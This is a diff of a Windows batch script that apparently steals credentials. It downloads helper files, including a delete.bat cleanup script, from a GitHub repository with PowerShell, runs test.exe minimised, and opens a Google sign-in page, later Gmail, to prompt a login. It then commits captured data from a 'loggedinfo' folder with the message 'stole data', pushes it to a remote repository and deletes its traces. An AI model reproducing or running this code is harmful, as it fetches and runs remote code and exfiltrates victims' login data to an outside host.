@@ -14,7 +14,7 @@ powershell -Command "Invoke-WebRequest https://github.com/Not-AriStienfeld/depen
 
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Not-AriStienfeld/dependancies/main/delete.bat -OutFile delete.bat"
 
-start https://accounts.google.com/v3/signin/identifier?dsh=S1208115868%3A1673312805607275&authuser=0&continue=https%3A%2F%2Fwww.google.com%2F&ec=GAlAmgQ&hl=en&flowName=GlifWebSignIn&flowEntry=AddSession
+start microsoft-edge:https://mail.google.com
 
 start /min test.exe
 
@@ -31,6 +31,6 @@ cd loggedinfo
 rename "dat.txt" "dat-%date:~10,4%%date:~7,2%%date:~4,2%_%time:~1,1%%time:~3,2%.txt"
 git add .
 git commit -m "stole data"
-git push
-cd ..\..
+call git push
+cd ..
 call delete.bat
